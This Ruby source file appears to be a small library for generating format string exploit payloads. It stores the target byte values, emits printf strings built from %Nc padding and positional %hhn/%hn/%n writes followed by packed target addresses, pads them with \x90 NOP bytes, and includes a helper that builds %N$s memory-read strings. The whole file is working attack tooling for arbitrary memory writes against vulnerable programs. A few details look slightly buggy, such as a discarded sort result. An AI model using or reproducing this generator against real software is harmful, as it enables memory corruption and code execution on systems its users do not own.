#coding: ascii-8bit
require "fsa/version"

class FSA
  
  def initialize(buffer_size = 0, is_x64=false)
    @mem = {}
    @buffer_size = buffer_size
    @is_x64 = is_x64
  end

  def []=(addr, value)
    
    if addr.class <= Integer
      if @is_x64
        addr = addr % 18446744073709551616
      else
        addr = addr % 4294967296
      end
    else
      raise TypeError, "Address must be Integer"
    end

    value_class = value.class
    
    case
    when value_class == Array
      value.each do |v|
        addr = self.[]=(addr, v)
      end
      return addr
      
    when value_class == String
      value.bytes.each_with_index do |v, i|
        @mem[addr + i] = v
      end
      return addr + value.length
      
    else

      bit_length = value.bit_length
      
      case
      when bit_length <= 8
        @mem[addr] = value
        return addr + 1
        
      when bit_length <= 16
        2.times do |i|
          @mem[addr + i] = (value.to_i >> (i * 8)) % 256
        end
        return addr + 2
        
      when bit_length <= 32
        4.times do |i|
          @mem[addr + i] = (value.to_i >> (i * 8)) % 256
        end
        return addr + 4
        
      end
    end
  end

  def [](addr)
    @mem[addr]
  end

  def payload(arg_index, padding = 0, start_len = 0)
    raise TypeError, "Index must be Integer" unless arg_index.class <= Integer
    raise TypeError, "Padding must be Integer" unless padding.class <= Integer
    raise TypeError, "Start_len must be Integer" unless start_len.class <= Integer
    gen = PayloadGenerator.new(@mem, @buffer_size, @is_x64)
    gen.payload(arg_index, padding, start_len)
  end

  def self.s(addr, arg_index)
    if addr.class <= Integer
      addr = addr % 4294967296
    else
      raise TypeError, "Address must be Integer"
    end
    if arg_index.class <= Integer
      arg_index = arg_index % 4294967296
    else
      raise TypeError, "Address must be Integer"
    end
    [addr].pack("L") + "%#{arg_index}$s"
  end
end

class PayloadGenerator
  
  def initialize(mem, buffer_size, is_x64=false)

    @mem = mem
    @buffer_size = buffer_size
    @tuples = []
    @addrs  = mem.keys
    @is_x64 = is_x64

    addr_index = 0
    while addr_index < @addrs.size
      
      addr = @addrs[addr_index]
      if [addr].pack(@is_x64 ? "Q" : "L").include?("\x00")

        if !mem.has_key?(addr-1) || [addr-1].pack(@is_x64 ? "Q" : "L").include?("\x00")
          puts("Can't avoid null byte at address 0x%x" % addr)
        else
          addr = addr - 1
        end
      end
      
      dword = 0
      4.times do |i|
        unless @mem.key?(addr + i)
          dword = -1
          break
        end
        dword |= @mem[addr + i] << (i * 8)
      end
      if 0 <= dword && dword < 65536
        @tuples << [addr, 4, dword]
      
        if @addrs[addr_index + 2] == addr + 3
          addr_index += 3
        elsif @addrs[addr_index + 3] == addr + 3
          addr_index += 4
        else
          raise "Unknown error. Missing bytes"
        end
      end
      
      word = 0
      2.times do |i|
        unless @mem.key?(addr + i)
          word = -1
          break
        end
        word |= @mem[addr + i] << (i * 8)
      end

      
      if 0 <= word && word < 65536
        @tuples << [addr, 2, word]
        if @addrs[addr_index] == addr + 1
          addr_index += 1
        elsif @addrs[addr_index + 1] == addr + 1
          addr_index += 2
        else
          raise "Unknown error. Missing bytes"
        end
        next
      else
        if (addr_index > 0) && (@addrs[addr_index - 1] > @addrs[addr_index] - 1)
          addr_index -= 1
        else
          @tuples << [addr, 1, @mem[addr]]
          addr_index += 1
        end
      end
    end
    @tuples.sort_by!(&:last).reverse
  end
  
  def payload(arg_index, padding = 0, start_len = 0)
    
    prev_len = -1
    prev_pay = ""
    index = arg_index * 10000
    @payload = ""
    align = @is_x64 ? 8 : 4
                        
    loop do
      
      @payload = ""
      
      addrs   = ""
      printed = start_len
      
      @tuples.each do |addr, size, value|
        
        print_len = value - printed
        
        if print_len > 2
          @payload += "%" + print_len.to_s + "c"
        elsif print_len >= 0
          @payload += "A" * print_len
        else
          puts "Can\'t write a value %08x (too small)." % value
          next
        end
        
        modi = {
         1 => "hh",
         2 => "h",
         4 =>  ""
        }[size]
        
        @payload += "%" + index.to_s + "$" + modi + "n"
        addrs += [addr].pack(@is_x64 ? "Q" : "L")
        printed += print_len
        index += 1
      end
      
      @payload += "A" * ((padding - @payload.length) % align)
      
      if @payload.length == prev_len
        @payload += addrs
        break
      end
      
      prev_len = @payload.length
      prev_pay = @payload
      index    = arg_index + @payload.length / align
      
    end
    
    puts "Payload contains NULL bytes." if @payload.include?("\x00")
    @payload.ljust(@buffer_size, "\x90")
  end
end

